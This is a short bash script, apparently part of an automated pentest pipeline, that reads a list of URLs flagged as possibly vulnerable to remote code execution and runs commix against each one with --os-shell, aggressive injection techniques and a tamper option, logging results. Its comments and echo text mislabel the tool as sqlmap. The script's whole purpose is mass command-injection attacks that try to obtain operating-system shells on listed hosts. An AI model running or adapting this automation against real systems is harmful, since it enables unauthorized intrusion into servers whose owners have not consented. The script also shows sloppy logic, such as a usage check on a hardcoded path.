#!/bin/bash

RED='\033[31m'
RESET='\033[0m'

path_dir='../result/url_possible_vulnarblities/RCE.txt'
# Check if the file with URLs is provided as an argument
if [ -z "$path_dir" ]; then
  echo "Usage: $0 <file_with_urls>"
  exit 1
  
fi
check_sqli(){
	# Read the file line by line
	if [ -e "../result/url_possible_vulnarblities/RCE.txt" ]; then
		cat $path_dir | while IFS= read -r url; do
		  # Check if the line is not empty
		  echo -e  ${RED}$url${RESET}
		  if [ -n "$url" ]; then
			echo "Running sqlmap on: $url"
			commix --url=$url --os-shell --level=3 --technique="ctes" --tamper=space2comment 

		  fi
		done 
	fi

}

mkdir -p ../result/commix_result
check_sqli > ../result/commix_result/res_commix.txt
